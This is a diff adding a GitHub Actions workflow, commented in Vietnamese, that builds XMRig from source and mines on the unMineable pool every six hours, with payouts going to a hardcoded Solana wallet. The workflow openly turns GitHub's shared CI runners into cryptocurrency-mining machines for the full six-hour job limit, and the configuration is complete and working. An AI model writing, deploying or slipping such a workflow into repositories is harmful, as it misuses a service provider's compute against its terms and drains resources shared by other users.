@@ -1,0 +1,33 @@
+name: SOL Miner via XMRig (unMineable)
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'  # Chạy mỗi 6 tiếng (UTC)
+
+jobs:
+  mine-sol:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # Giới hạn 6 giờ
+
+    steps:
+      - name: Cài gói cần thiết
+        run: |
+          sudo apt update
+          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Tải và build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Chạy đào XMR → trả SOL
+        run: |
+          cd xmrig/build
+          ./xmrig -o rx.unmineable.com:3333 \
+            -a rx -k \
+            -u SOL:4nGLHFmc5zifbNMtQA6okrtnu1Meb5My7CUv4zhKzouB.sol-miner-1 \
+            -p x
